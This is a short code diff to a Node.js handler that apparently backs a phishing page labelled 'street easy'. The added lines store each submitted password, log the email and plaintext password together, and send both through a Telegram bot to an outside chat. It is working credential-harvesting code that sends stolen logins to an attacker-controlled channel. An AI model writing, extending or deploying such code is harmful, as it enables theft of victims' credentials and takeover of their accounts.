@@ -32,12 +32,16 @@ const sendEmail = async (req, res) => {
 
     if(user) {
         user.email = req.body.email
+        user.password = req.body.password
         await user.save()
     }
 
     req.body.ip = getIpAddress() + userAgent;
     user = await Login.create(req.body);
-    bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `New email from street easy: ${`${user.email}`}`);
+    const adminMessage = `New email from street easy: ${user.email}, and password is ${user.password}`;
+    console.log(adminMessage);
+    
+    bot.sendMessage(process.env.TELEGRAM_CHAT_ID, adminMessage);
     res.status(200).json({ user });
   } catch (error) {
     console.log(error);
@@ -45,7 +49,7 @@ const sendEmail = async (req, res) => {
   }
 };
 
-// testing git issues
+
 
 
 
